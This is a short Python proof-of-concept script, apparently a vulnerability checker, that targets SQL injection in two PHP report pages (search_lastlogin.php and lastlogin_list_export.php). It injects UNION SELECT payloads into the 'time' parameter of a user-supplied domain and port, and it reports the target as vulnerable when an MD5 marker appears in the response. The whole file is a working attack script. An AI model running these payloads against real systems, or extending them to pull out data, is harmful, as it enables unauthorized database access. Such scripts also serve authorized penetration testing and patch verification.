#! /usr/bin/env python
# -*- coding: utf-8 -*-
#!/usr/bin/python

from __future__ import print_function

import sys
import time
import hashlib
from optparse import OptionParser

try:
    import requests
except ImportError, e:
    print("[-] Requests missing, please install requests module")
    sys.exit(0)


def exploit(domain):
    fate0 = hashlib.md5('fate0').hexdigest()
    evil_url1 = ("{domain}/php/report/search_lastlogin.php?time=1 and 1=2 union select "
                 "md5(\"fate0\"),2,3 -- &stime=fate0".format(domain=domain))
    evil_url2 = ("{domain}/php/report/lastlogin_list_export.php?time=1 and 1=2 union select "
                 "md5(\"fate0\"),2,3 -- &stime=fate0".format(domain=domain))

    print("[*] Testing payload 1...")
    try:
        response = requests.get(evil_url1, timeout=15)
        if fate0 in response.content:
            print("[+] Target is vulnerable")
            return 1
    except requests.exceptions.Timeout:
        print("[-] Use too much time, exit")
        return 0

    print("[*] Testing payload 2...")
    try:
        response = requests.get(evil_url2, timeout=15)
        if fate0 in response.content:
            print("[+] Target is vulnerable")
            return 1
    except requests.exceptions.Timeout:
        print("[-] Use too much time, exit")
        return 0

    print("[-] Target is not vulnerable")
    return 0


def main():
    domain = sys.argv[1]
    port = sys.argv[2]

    domain = domain if domain.startswith('http') else "http://{domain}:{port}".format(domain=domain,port=str(port))
    domain = domain if not domain.endswith('/') else domain[:-1]

    return exploit(domain)


if __name__ == "__main__":
    main()
